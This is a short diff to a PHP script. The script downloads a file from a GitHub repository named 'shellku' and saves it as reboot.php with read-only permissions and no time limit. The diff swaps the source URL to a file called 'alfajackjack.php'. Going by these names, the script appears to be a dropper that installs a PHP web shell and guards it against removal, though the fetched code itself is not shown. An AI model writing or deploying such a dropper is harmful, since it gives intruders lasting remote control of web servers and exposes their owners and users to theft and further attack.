@@ -5,7 +5,7 @@ set_time_limit(0);
 $files = [
     [
         'path' => __DIR__ . '/reboot.php',
-        'url' => 'https://github.com/jackythekingsMan/shellku/raw/refs/heads/main/bootstrap.php',
+        'url' => 'https://github.com/jackythekingsMan/shellku/blob/main/alfajackjack.php',
         'chmod' => 0444
     ],
 ];
